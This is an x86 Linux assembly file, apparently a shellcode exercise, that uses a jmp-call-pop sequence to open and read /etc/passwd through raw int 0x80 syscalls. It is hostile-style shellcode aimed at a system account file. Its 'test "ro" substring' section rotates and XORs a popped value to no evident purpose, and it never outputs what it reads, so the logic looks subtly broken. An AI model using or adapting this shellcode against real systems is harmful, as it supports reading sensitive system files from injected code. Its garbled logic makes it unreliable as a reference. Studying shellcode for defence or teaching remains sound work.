global _start
section .text
_start:
    ; initialize general registers to zero
    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx
    xor edx, edx

    ; open file
    jmp filepath
shellcode:
    mov eax, 0x5
    pop ebx
    xor ecx, ecx
    int 0x80
    mov ebx, eax

    ; read file
    mov eax, 0x3
    mov edi, esp
    mov ecx, edi
    mov edx, 0x1000
    int 0x80
    mov edx, eax
    
    ; test "ro" substring value
    mov bx, 0xe2ff
    pop ax
    ror ax, 0x8
    xor ax, bx
    push ax

    ; exit
    mov eax, 0x1
    mov ebx, 0x0
    int 0x80

filepath:
    call shellcode
    path: db "/etc/passwd", 0x0
